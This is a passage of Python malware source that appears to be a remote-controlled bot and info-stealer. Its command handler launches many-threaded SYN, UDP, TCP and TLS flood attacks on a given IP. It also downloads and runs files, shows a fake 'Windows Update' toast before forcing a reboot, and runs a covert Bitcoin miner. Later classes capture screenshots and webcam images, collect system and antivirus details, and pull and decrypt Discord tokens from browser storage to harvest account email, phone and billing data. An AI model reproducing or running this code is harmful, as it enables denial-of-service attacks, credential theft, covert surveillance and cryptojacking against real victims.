                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".ntp-amp"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        target_port = int(target_port)
                        duration = int(duration)
                        threads = [threading.Thread(target=ntp_amp_attack, args=(target_ip, target_port, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".udp-amp"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        target_port = int(target_port)
                        duration = int(duration)
                        threads = [threading.Thread(target=udp_amp_attack, args=(target_ip, target_port, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".udp-raw"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        target_port = int(target_port)
                        duration = int(duration)
                        threads = [threading.Thread(target=udp_raw_attack, args=(target_ip, target_port, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".tcp-amp"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        target_port = int(target_port)
                        duration = int(duration)
                        threads = [threading.Thread(target=tcp_amp_attack, args=(target_ip, target_port, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".tcp-pure"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        target_port = int(target_port)
                        duration = int(duration)
                        threads = [threading.Thread(target=tcp_pure_attack, args=(target_ip, target_port, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".tcp-bypass"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        target_port = int(target_port)
                        duration = int(duration)
                        threads = [threading.Thread(target=tcp_bypass_attack, args=(target_ip, target_port, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".tls"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        target_port = int(target_port)
                        duration = int(duration)
                        threads = [threading.Thread(target=tls_attack, args=(target_ip, target_port, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".udp-pps"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        target_port = int(target_port)
                        duration = int(duration)
                        threads = [threading.Thread(target=udp_pps_attack, args=(target_ip, target_port, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".udp-gbps"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        target_port = int(target_port)
                        duration = int(duration)
                        threads = [threading.Thread(target=udp_gbps_attack, args=(target_ip, target_port, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".discord"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    threading.Thread(target=discord_attack, args=(target_ip, int(target_port), int(duration))).start()

            elif message.startswith(".home"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        duration = int(duration)
                        threading.Thread(target=combined_flood, args=(target_ip, int(target_port), duration)).start()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".syn"):
                parts = message.split()
                if len(parts) == 4:
                    _, target_ip, target_port, duration = parts
                    try:
                        target_port = int(target_port)
                        duration = int(duration)
                        threads = [threading.Thread(target=syn_flood, args=(target_ip, target_port, duration)) for _ in range(200)]
                        for thread in threads:
                            thread.start()
                        for thread in threads:
                            thread.join()
                    except ValueError:
                        print("ERROR")
                else:
                    print("ERROR")

            elif message.startswith(".start-mining"):
                mining_thread = threading.Thread(target=start_mining, daemon=True)
                mining_thread.start()

            elif message.startswith(".stop-mining"):
                if 'mining_thread' in locals() and mining_thread.is_alive():
                    stop_mining()

            elif message.startswith(".download"):
                def download_file():
                    parts = message.split()
                    if len(parts) == 2:
                        url = parts[1]
                        download_folder = "$77/downloads"
                        if not os.path.exists(download_folder):
                            os.makedirs(download_folder)
                        filename = os.path.join(download_folder, url.split("/")[-1])
                        try:
                            with requests.get(url, stream=True) as r:
                                r.raise_for_status()
                                with open(filename, "wb") as f:
                                    for chunk in r.iter_content(chunk_size=8192):
                                        f.write(chunk)
                            print(f"Downloaded {filename}")
                        except requests.RequestException:
                            print("Error downloading file")
                threading.Thread(target=download_file, daemon=True).start()

            elif message.startswith(".run"):
                def run_file():
                    parts = message.split()
                    if len(parts) == 2:
                        file_name = parts[1]
                        download_folder = "$77/downloads"
                        file_path = os.path.join(download_folder, file_name)
                        if not os.path.exists(download_folder):
                            os.makedirs(download_folder)
                        if not os.path.isfile(file_path):
                            print("Not a file")
                        else:
                            try:
                                subprocess.run(["runas", "/savecred", file_path], check=True)
                            except subprocess.CalledProcessError:
                                print("Error running file")
                threading.Thread(target=run_file, daemon=True).start()

            elif message.startswith(".restart"):
                def restart():
                    toaster = ToastNotifier()
                    toaster.show_toast(
                        "Windows Update",
                        "A critical update has been pending for over 30 days. Your system will restart in 1 minute to apply the update. Please save all work to prevent data loss.",
                        duration=15,
                    )
                    time.sleep(60)
                    os.system("shutdown /r /f /t 0")

                threading.Thread(target=restart, daemon=True).start()

fShutdown = False
listfThreadRunning = [False] * 2
local_height = 0
nHeightDiff = {}
updatedPrevHash = None
job_id = None
prevhash = None
coinb1 = None
coinb2 = None
merkle_branch = None
version = None
nbits = None
ntime = None
clean_jobs = None
sub_details = None
extranonce1 = None
extranonce2_size = None

sock = None

def timer() :
    tcx = datetime.now().time()
    return tcx

address = 'REMEMBER TO CHANGE THIS TO YOUR BTC ADDRESS' #---------------------------------------------------- DONT FORGET -------------------------------------------------- 

print(Back.BLUE , Fore.WHITE , 'BTC WALLET:' , Fore.BLACK , str(address) , Style.RESET_ALL)


def handler(signal_received , frame) :
    ctx.fShutdown = True
    print(Fore.MAGENTA , '[' , timer() , ']' , Fore.YELLOW , 'Terminating Miner, Please Wait..')


def logg(msg) :
    logging.basicConfig(level = logging.INFO , filename = "miner.log" ,
                        format = '%(asctime)s %(message)s')
    logging.info(msg)


def get_current_block_height() :
    r = requests.get('https://blockchain.info/latestblock')
    return int(r.json()['height'])


def check_for_shutdown(t) :
    n = t.n
    if ctx.fShutdown :
        if n != -1 :
            ctx.listfThreadRunning[n] = False
            t.exit = True

class ExitedThread(threading.Thread) :
    def __init__(self , arg , n) :
        super(ExitedThread , self).__init__()
        self.exit = False
        self.arg = arg
        self.n = n

    def run(self) :
        self.thread_handler(self.arg , self.n)
        pass

    def thread_handler(self , arg , n) :
        while True :
            check_for_shutdown(self)
            if self.exit :
                break
            ctx.listfThreadRunning[n] = True
            try :
                self.thread_handler2(arg)
            except Exception as e :
                logg("ThreadHandler()")
                print(Fore.MAGENTA , '[' , timer() , ']' , Fore.WHITE , 'ThreadHandler()')
                logg(e)
                print(Fore.RED , e)
            ctx.listfThreadRunning[n] = False

            time.sleep(2)
            pass

    def thread_handler2(self , arg) :
        raise NotImplementedError("must impl this func")

    def check_self_shutdown(self) :
        check_for_shutdown(self)

    def try_exit(self) :
        self.exit = True
        ctx.listfThreadRunning[self.n] = False
        pass

def bitcoin_miner(t , restarted = False) :
    if restarted :
        logg('\n[*] Bitcoin Miner restarted')
        print(Fore.MAGENTA , '[' , timer() , ']' , Fore.YELLOW , 'Programmer = Mmdrza.Com')
        print(Fore.MAGENTA , '[' , timer() , ']' , Fore.BLUE , '[*] Bitcoin Miner Restarted')
        time.sleep(5)

    target = (ctx.nbits[2 :] + '00' * (int(ctx.nbits[:2] , 16) - 3)).zfill(64)
    extranonce2 = hex(random.randint(0 , 2 ** 32 - 1))[2 :].zfill(2 * ctx.extranonce2_size)  # create random

    coinbase = ctx.coinb1 + ctx.extranonce1 + extranonce2 + ctx.coinb2
    coinbase_hash_bin = hashlib.sha256(hashlib.sha256(binascii.unhexlify(coinbase)).digest()).digest()

    merkle_root = coinbase_hash_bin
    for h in ctx.merkle_branch :
        merkle_root = hashlib.sha256(hashlib.sha256(merkle_root + binascii.unhexlify(h)).digest()).digest()

    merkle_root = binascii.hexlify(merkle_root).decode()

    merkle_root = ''.join([merkle_root[i] + merkle_root[i + 1] for i in range(0 , len(merkle_root) , 2)][: :-1])

    work_on = get_current_block_height()

    ctx.nHeightDiff[work_on + 1] = 0

    _diff = int("00000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF" , 16)

    logg('[*] Working to solve block with height {}'.format(work_on + 1))
    print(Fore.MAGENTA , '[' , timer() , ']' , Fore.YELLOW , '[*] Working to solve block with ' , Fore.RED ,
          'height {}'.format(work_on + 1))

    while True :
        t.check_self_shutdown()
        if t.exit :
            break

        if ctx.prevhash != ctx.updatedPrevHash :
            logg('[*] New block {} detected on network '.format(ctx.prevhash))
            print(Fore.YELLOW , '[' , timer() , ']' , Fore.MAGENTA , '[*] New block {} detected on' , Fore.BLUE ,
                  ' network '.format(ctx.prevhash))
            logg('[*] Best difficulty will trying to solve block {} was {}'.format(work_on + 1 ,
                                                                                   ctx.nHeightDiff[work_on + 1]))
            print(Fore.MAGENTA , '[' , timer() , ']' , Fore.GREEN , '[*] Best difficulty will trying to solve block' ,
                  Fore.WHITE , ' {} ' , Fore.BLUE ,
                  'was {}'.format(work_on + 1 ,
                                  ctx.nHeightDiff[work_on + 1]))
            ctx.updatedPrevHash = ctx.prevhash
            bitcoin_miner(t , restarted = True)
            print(Back.YELLOW , Fore.MAGENTA , '[' , timer() , ']' , Fore.BLUE , 'Bitcoin Miner Restart Now...' ,
                  Style.RESET_ALL)
            continue

        nonce = hex(random.randint(0 , 2 ** 32 - 1))[2 :].zfill(8)
        blockheader = ctx.version + ctx.prevhash + merkle_root + ctx.ntime + ctx.nbits + nonce + \
                      '000000800000000000000000000000000000000000000000000000000000000000000000000000000000000080020000'
        hash = hashlib.sha256(hashlib.sha256(binascii.unhexlify(blockheader)).digest()).digest()
        hash = binascii.hexlify(hash).decode()

        if hash.startswith('0000000') :
            logg('[*] New hash: {} for block {}'.format(hash , work_on + 1))
            print(Fore.MAGENTA , '[' , timer() , ']' , Fore.YELLOW , '[*] New hash:' , Fore.WHITE , ' {} for block' ,
                  Fore.WHITE ,
                  ' {}'.format(hash , work_on + 1))
            print(Fore.MAGENTA , '[' , timer() , ']' , Fore.BLUE , 'Hash:' , str(hash))
        this_hash = int(hash , 16)

        difficulty = _diff / this_hash

        if ctx.nHeightDiff[work_on + 1] < difficulty :
            ctx.nHeightDiff[work_on + 1] = difficulty

        if hash < target :
            logg('[*] Block {} solved.'.format(work_on + 1))

            print(Fore.MAGENTA , '[' , timer() , ']' , Fore.YELLOW , '[*] Block {} solved.'.format(work_on + 1))
            logg('[*] Block hash: {}'.format(hash))
            print(Fore.YELLOW)
            print(Fore.MAGENTA , '[' , timer() , ']' , Fore.YELLOW , '[*] Block hash: {}'.format(hash))
            logg('[*] Blockheader: {}'.format(blockheader))

            print(Fore.YELLOW , '[*] Blockheader: {}'.format(blockheader))
            payload = bytes('{"params": ["' + address + '", "' + ctx.job_id + '", "' + ctx.extranonce2 \
                            + '", "' + ctx.ntime + '", "' + nonce + '"], "id": 1, "method": "mining.submit"}\n' ,
                            'utf-8')
            logg('[*] Payload: {}'.format(payload))
            print(Fore.MAGENTA , '[' , timer() , ']' , Fore.BLUE , '[*] Payload:' , Fore.GREEN , ' {}'.format(payload))
            sock.sendall(payload)
            ret = sock.recv(1024)
            logg('[*] Pool response: {}'.format(ret))
            print(Fore.MAGENTA , '[' , timer() , ']' , Fore.GREEN , '[*] Pool Response:' , Fore.CYAN ,
                  ' {}'.format(ret))
            return True

def block_listener(t) :
    sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    sock.connect(('solo.ckpool.org' , 3333))
    sock.sendall(b'{"id": 1, "method": "mining.subscribe", "params": []}\n')
    lines = sock.recv(1024).decode().split('\n')
    response = json.loads(lines[0])
    ctx.sub_details , ctx.extranonce1 , ctx.extranonce2_size = response['result']
    sock.sendall(b'{"params": ["' + address.encode() + b'", "password"], "id": 2, "method": "mining.authorize"}\n')
    response = b''
    while response.count(b'\n') < 4 and not (b'mining.notify' in response) : response += sock.recv(1024)

    responses = [json.loads(res) for res in response.decode().split('\n') if
                 len(res.strip()) > 0 and 'mining.notify' in res]
    ctx.job_id , ctx.prevhash , ctx.coinb1 , ctx.coinb2 , ctx.merkle_branch , ctx.version , ctx.nbits , ctx.ntime , ctx.clean_jobs = \
        responses[0]['params']
    ctx.updatedPrevHash = ctx.prevhash

    while True :
        t.check_self_shutdown()
        if t.exit :
            break

        response = b''
        while response.count(b'\n') < 4 and not (b'mining.notify' in response) : response += sock.recv(1024)
        responses = [json.loads(res) for res in response.decode().split('\n') if
                     len(res.strip()) > 0 and 'mining.notify' in res]

        if responses[0]['params'][1] != ctx.prevhash :
            ctx.job_id , ctx.prevhash , ctx.coinb1 , ctx.coinb2 , ctx.merkle_branch , ctx.version , ctx.nbits , ctx.ntime , ctx.clean_jobs = \
                responses[0]['params']

class CoinMinerThread(ExitedThread) :
    def __init__(self , arg = None) :
        super(CoinMinerThread , self).__init__(arg , n = 0)

    def thread_handler2(self , arg) :
        self.thread_bitcoin_miner(arg)

    def thread_bitcoin_miner(self , arg) :
        ctx.listfThreadRunning[self.n] = True
        check_for_shutdown(self)
        try :
            ret = bitcoin_miner(self)
            logg(Fore.MAGENTA , "[" , timer() , "] [*] Miner returned %s\n\n" % "true" if ret else "false")
            print(Fore.LIGHTCYAN_EX , "[*] Miner returned %s\n\n" % "true" if ret else "false")
        except Exception as e :
            logg("[*] Miner()")
            print(Back.WHITE , Fore.MAGENTA , "[" , timer() , "]" , Fore.BLUE , "[*] Miner()")
            logg(e)
            traceback.print_exc()
        ctx.listfThreadRunning[self.n] = False

    pass

class NewSubscribeThread(ExitedThread) :
    def __init__(self , arg = None) :
        super(NewSubscribeThread , self).__init__(arg , n = 1)

    def thread_handler2(self , arg) :
        self.thread_new_block(arg)

    def thread_new_block(self , arg) :
        ctx.listfThreadRunning[self.n] = True
        check_for_shutdown(self)
        try :
            ret = block_listener(self)
        except Exception as e :
            logg("[*] Subscribe thread()")
            print(Fore.MAGENTA , "[" , timer() , "]" , Fore.YELLOW , "[*] Subscribe thread()")
            logg(e)
            traceback.print_exc()
        ctx.listfThreadRunning[self.n] = False

    pass

def StartMining() :
    subscribe_t = NewSubscribeThread(None)
    subscribe_t.start()
    logg("[*] Subscribe thread started.")
    print(Fore.MAGENTA , "[" , timer() , "]" , Fore.GREEN , "[*] Subscribe thread started.")

    time.sleep(4)

    miner_t = CoinMinerThread(None)
    miner_t.start()
    logg("[*] Bitcoin Miner Thread Started")
    print(Fore.MAGENTA , "[" , timer() , "]" , Fore.GREEN , "[*] Bitcoin Miner Thread Started")
    print(Fore.BLUE , '--------------~~( ' , Fore.YELLOW , 'M M D R Z A . C o M' , Fore.BLUE , ' )~~--------------')


# -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

class RecoveryFolder:
    def __init__(self):
        self.base_path = r"C:\Windows\System32\$77\Midnight Grabbed"
        self.subfolders = ["System Information", "Messaging", "Browsers", "Game", "Wifi"]
        self.files = [
            "screenshot.png", "webcam.png",
        ]
        self.folder_path = os.path.join(self.base_path, "System Information")
        os.makedirs(self.folder_path, exist_ok=True)

    def create_structure(self):
        os.makedirs(self.base_path, exist_ok=True)
        for folder in self.subfolders:
            os.makedirs(os.path.join(self.base_path, folder), exist_ok=True)
        for file in self.files:
            open(os.path.join(self.base_path, file), 'w').close()

    def take_screenshot(self):
        screenshot_path = os.path.join(self.base_path, "screenshot.png")
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path)

    def capture_webcam(self):
        webcam_path = os.path.join(self.base_path, "webcam.png")
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            cv2.imwrite(webcam_path, frame)
        cam.release()

    def write_to_file(self, filename, content):
        file_path = os.path.join(self.folder_path, filename)
        with open(file_path, "w") as file:
            file.write(content)

    def get_antivirus_info(self):
        result = subprocess.run("wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName", 
                                shell=True, capture_output=True, text=True)
        return result.stdout.strip()

    def get_cpu_info(self):
        cpu_info = (
            f"Processor: {platform.processor()}\n"
            f"Physical Cores: {psutil.cpu_count(logical=False)}\n"
            f"Logical CPUs: {psutil.cpu_count(logical=True)}\n"
            f"Max Frequency: {psutil.cpu_freq().max} MHz\n"
            f"Min Frequency: {psutil.cpu_freq().min} MHz\n"
            f"Current Frequency: {psutil.cpu_freq().current} MHz\n"
            f"CPU Usage Per Core: {', '.join([f'{x}%' for x in psutil.cpu_percent(percpu=True, interval=1)])}\n"
            f"Total CPU Usage: {psutil.cpu_percent(interval=1)}%"
        )
        
        # Check if sensors_temperatures() exists in psutil
        if hasattr(psutil, 'sensors_temperatures'):
            temp_info = psutil.sensors_temperatures()
            if 'coretemp' in temp_info:
                cpu_info += f"\nCPU Temperature: {temp_info['coretemp'][0].current}°C"
            else:
                cpu_info += "\nCPU Temperature: N/A"
        else:
            cpu_info += "\nCPU Temperature: N/A"
        
        return cpu_info

    def get_gpu_info(self):
        result = subprocess.run("wmic path win32_videocontroller get name,adapterram,driverdate,driverversion", 
                                shell=True, capture_output=True, text=True)
        gpu_info = result.stdout.strip()

        return gpu_info

    def get_hostname_and_ip(self):
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        return f"Hostname: {hostname}\nIP Address: {ip_address}"

    def get_installed_programs(self):
        result = subprocess.run('wmic product get name,version', shell=True, capture_output=True, text=True)
        return result.stdout.strip()

    def get_mac_addresses(self):
        macs = []
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == psutil.AF_LINK:
                    macs.append(addr.address)
        return "\n".join(macs)

    def get_os_info(self):
        os_info = f"System: {platform.system()}\nVersion: {platform.version()}\nRelease: {platform.release()}\nArchitecture: {platform.architecture()[0]}"
        return os_info

    def get_process_list(self):
        processes = "\n".join([proc.info['name'] for proc in psutil.process_iter(['name'])])
        return processes

    def get_ram_info(self):
        memory = psutil.virtual_memory()
        swap_memory = psutil.swap_memory()

        ram_info = (
            f"Total RAM: {memory.total / 1e9:.2f} GB\n"
            f"Available RAM: {memory.available / 1e9:.2f} GB\n"
            f"Used RAM: {memory.used / 1e9:.2f} GB\n"
            f"Percentage: {memory.percent}%\n"
            f"Free RAM: {memory.free / 1e9:.2f} GB\n"
            f"Swap Total: {swap_memory.total / 1e9:.2f} GB\n"
            f"Swap Used: {swap_memory.used / 1e9:.2f} GB\n"
            f"Swap Free: {swap_memory.free / 1e9:.2f} GB\n"
            f"Swap Percentage: {swap_memory.percent}%"
        )
        return ram_info

    def get_running_services(self):
        result = subprocess.run("tasklist /svc", shell=True, capture_output=True, text=True)
        return result.stdout.strip()

    def get_system_summary(self):
        result = subprocess.run("systeminfo", shell=True, capture_output=True, text=True)
        return result.stdout.strip()

    def create_files(self):
        self.write_to_file("antivirus.txt", self.get_antivirus_info())
        self.write_to_file("cpu_info.txt", self.get_cpu_info())
        self.write_to_file("gpu_info.txt", self.get_gpu_info())
        self.write_to_file("hostname_ip.txt", self.get_hostname_and_ip())
        self.write_to_file("installed_programs.txt", self.get_installed_programs())
        self.write_to_file("macaddresses.txt", self.get_mac_addresses())
        self.write_to_file("os_info.txt", self.get_os_info())
        self.write_to_file("process_list.txt", self.get_process_list())
        self.write_to_file("ram_info.txt", self.get_ram_info())
        self.write_to_file("running_services.txt", self.get_running_services())
        self.write_to_file("System Information.txt", self.get_system_summary())

class Syscalls:
    @staticmethod
    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str= None) -> bytes:

        class DATA_BLOB(ctypes.Structure):

            _fields_ = [
                ("cbData", ctypes.c_ulong),
                ("pbData", ctypes.POINTER(ctypes.c_ubyte))
            ]
        
        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()
        pOptionalEntropy = None

        if optional_entropy is not None:
            optional_entropy = optional_entropy.encode("utf-16")
            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))

        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
            data = (ctypes.c_ubyte * pDataOut.cbData)()
            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
            return bytes(data)

        raise ValueError("Invalid encrypted_data provided!")

class Discord:
    httpClient = PoolManager(cert_reqs="CERT_NONE")
    ROAMING = os.getenv("appdata")
    LOCALAPPDATA = os.getenv("localappdata")
    REGEX = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
    REGEX_ENC = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"

    @staticmethod
    def GetHeaders(token: str = None) -> dict:
        headers = {
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36"
        }

        if token:
            headers["authorization"] = token

        return headers

    @staticmethod
    def GetTokens() -> list[dict]:
        results: list[dict] = list()
        tokens: list[str] = list()
        threads: list[Thread] = list()

        paths = {
            "Discord": os.path.join(Discord.ROAMING, "discord"),
            "Discord Canary": os.path.join(Discord.ROAMING, "discordcanary"),
            "Lightcord": os.path.join(Discord.ROAMING, "Lightcord"),
            "Discord PTB": os.path.join(Discord.ROAMING, "discordptb"),
            "Opera": os.path.join(Discord.ROAMING, "Opera Software", "Opera Stable"),
            "Opera GX": os.path.join(Discord.ROAMING, "Opera Software", "Opera GX Stable"),
            "Amigo": os.path.join(Discord.LOCALAPPDATA, "Amigo", "User Data"),
            "Torch": os.path.join(Discord.LOCALAPPDATA, "Torch", "User Data"),
            "Kometa": os.path.join(Discord.LOCALAPPDATA, "Kometa", "User Data"),
            "Orbitum": os.path.join(Discord.LOCALAPPDATA, "Orbitum", "User Data"),
            "CentBrowse": os.path.join(Discord.LOCALAPPDATA, "CentBrowser", "User Data"),
            "7Sta": os.path.join(Discord.LOCALAPPDATA, "7Star", "7Star", "User Data"),
            "Sputnik": os.path.join(Discord.LOCALAPPDATA, "Sputnik", "Sputnik", "User Data"),
            "Vivaldi": os.path.join(Discord.LOCALAPPDATA, "Vivaldi", "User Data"),
            "Chrome SxS": os.path.join(Discord.LOCALAPPDATA, "Google", "Chrome SxS", "User Data"),
            "Chrome": os.path.join(Discord.LOCALAPPDATA, "Google", "Chrome", "User Data"),
            "FireFox": os.path.join(Discord.ROAMING, "Mozilla", "Firefox", "Profiles"),
            "Epic Privacy Browse": os.path.join(Discord.LOCALAPPDATA, "Epic Privacy Browser", "User Data"),
            "Microsoft Edge": os.path.join(Discord.LOCALAPPDATA, "Microsoft", "Edge", "User Data"),
            "Uran": os.path.join(Discord.LOCALAPPDATA, "uCozMedia", "Uran", "User Data"),
            "Yandex": os.path.join(Discord.LOCALAPPDATA, "Yandex", "YandexBrowser", "User Data"),
            "Brave": os.path.join(Discord.LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"),
            "Iridium": os.path.join(Discord.LOCALAPPDATA, "Iridium", "User Data"),
        }

        for name, path in paths.items():
            if os.path.isdir(path):
                if name == "FireFox":
                    t = Thread(target=lambda: tokens.extend(Discord.FireFoxSteal(path) or list()))
                    t.start()
                    threads.append(t)
                else:
                    t = Thread(target=lambda: tokens.extend(Discord.SafeStorageSteal(path) or list()))
                    t.start()
                    threads.append(t)

                    t = Thread(target=lambda: tokens.extend(Discord.SimpleSteal(path) or list()))
                    t.start()
                    threads.append(t)

        for thread in threads:
            thread.join()

        tokens = [*set(tokens)]

        for token in tokens:
            r: HTTPResponse = Discord.httpClient.request("GET", "https://discord.com/api/v9/users/@me", headers=Discord.GetHeaders(token.strip()))
            if r.status == 200:
                r = r.data.decode(errors="ignore")
                r = json.loads(r)
                user = r['username'] + '#' + str(r['discriminator'])
                id = r['id']
                email = r['email'].strip() if r['email'] else '(No Email)'
                phone = r['phone'] if r['phone'] else '(No Phone Number)'
                verified = r['verified']
                mfa = r['mfa_enabled']
                nitro_type = r.get('premium_type', 0)
                nitro_infos = {
                    0: 'No Nitro',
                    1: 'Nitro Classic',
                    2: 'Nitro',
                    3: 'Nitro Basic'
                }

                nitro_data = nitro_infos.get(nitro_type, '(Unknown)')

                billing = json.loads(Discord.httpClient.request('GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Discord.GetHeaders(token)).data.decode(errors="ignore"))
                if len(billing) == 0:
                    billing = '(No Payment Method)'
                else:
                    methods = {
                        'Card': 0,
                        'Paypal': 0,
                        'Unknown': 0,
                    }
                    for m in billing:
                        if not isinstance(m, dict):
                            continue
                        method_type = m.get('type', 0)

                        match method_type:
                            case 1:
                                methods['Card'] += 1
                            case 2:
                                methods['Paypal'] += 1
                            case _:
                                methods['Unknown'] += 1

                    billing = ', '.join(['{} ({})'.format(name, quantity) for name, quantity in methods.items() if quantity != 0]) or 'None'
                gifts = list()
                r = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers=Discord.GetHeaders(token)).data.decode(errors="ignore")
                if 'code' in r:
                    r = json.loads(r)
                    for i in r:
                        if isinstance(i, dict):
                            code = i.get('code')
                            if i.get('promotion') is None or not isinstance(i['promotion'], dict):
                                continue
                            title = i['promotion'].get('outbound_title')
                            if code and title:
                                gifts.append(f'{title}: {code}')
                if len(gifts) == 0:
                    gifts = 'Gift Codes: (NONE)'
                else:
                    gifts = 'Gift Codes:\n\t' + '\n\t'.join(gifts)
                results.append({
                    'USERNAME': user,
                    'USERID': id,
                    'MFA': mfa,
                    'EMAIL': email,
                    'PHONE': phone,
                    'VERIFIED': verified,
                    'NITRO': nitro_data,
                    'BILLING': billing,
                    'TOKEN': token,
                    'GIFTS': gifts
                })

        return results

    @staticmethod
    def SafeStorageSteal(path: str) -> list[str]:
        encryptedTokens = list()
        tokens = list()
        key: str = None
        levelDbPaths: list[str] = list()

        localStatePath = os.path.join(path, "Local State")

        for root, dirs, _ in os.walk(path):
            for dir in dirs:
                if dir == "leveldb":
                    levelDbPaths.append(os.path.join(root, dir))

        if os.path.isfile(localStatePath) and levelDbPaths:
            with open(localStatePath, errors="ignore") as file:
                jsonContent: dict = json.load(file)

            key = jsonContent['os_crypt']['encrypted_key']
            key = base64.b64decode(key)[5:]

            for levelDbPath in levelDbPaths:
                for file in os.listdir(levelDbPath):
                    if file.endswith((".log", ".ldb")):
                        filepath = os.path.join(levelDbPath, file)
                        with open(filepath, errors="ignore") as file:
                            lines = file.readlines()

                        for line in lines:
                            if line.strip():
                                matches: list[str] = re.findall(Discord.REGEX_ENC, line)
                                for match in matches:
                                    match = match.rstrip("\\")
                                    if not match in encryptedTokens:
                                        match = base64.b64decode(match.split("dQw4w9WgXcQ:")[1].encode())
                                        encryptedTokens.append(match)

        for token in encryptedTokens:
            try:
                token = pyaes.AESModeOfOperationGCM(Syscalls.CryptUnprotectData(key), token[3:15]).decrypt(token[15:])[:-16].decode(errors="ignore")
                if token:
                    tokens.append(token)
            except Exception:
                pass

        return tokens

    @staticmethod
    def SimpleSteal(path: str) -> list[str]:
        tokens = list()
        levelDbPaths = list()

        for root, dirs, _ in os.walk(path):
            for dir in dirs:
                if dir == "leveldb":
                    levelDbPaths.append(os.path.join(root, dir))

        for levelDbPath in levelDbPaths:
            for file in os.listdir(levelDbPath):
                if file.endswith((".log", ".ldb")):
                    filepath = os.path.join(levelDbPath, file)
                    with open(filepath, errors="ignore") as file:
                        lines = file.readlines()

                    for line in lines:
                        if line.strip():
                            matches: list[str] = re.findall(Discord.REGEX, line.strip())
                            for match in matches:
                                match = match.rstrip("\\")
                                if not match in tokens:
                                    tokens.append(match)

        return tokens

    @staticmethod
    def FireFoxSteal(path: str) -> list[str]:
        tokens = list()

        for root, _, files in os.walk(path):
            for file in files:
                if file.lower().endswith(".sqlite"):
                    filepath = os.path.join(root, file)
                    with open(filepath, errors="ignore") as file:
                        lines = file.readlines()

                    for line in lines:
                        if line.strip():
                            matches: list[str] = re.findall(Discord.REGEX, line)
                            for match in matches:
                                match = match.rstrip("\\")
                                if not match in tokens:
                                    tokens.append(match)

        return tokens

class Game:
    def __init__(self):
        self.Separator = "\n"
        self.RobloxCookiesCount = 0
        self.Cookies = []
    
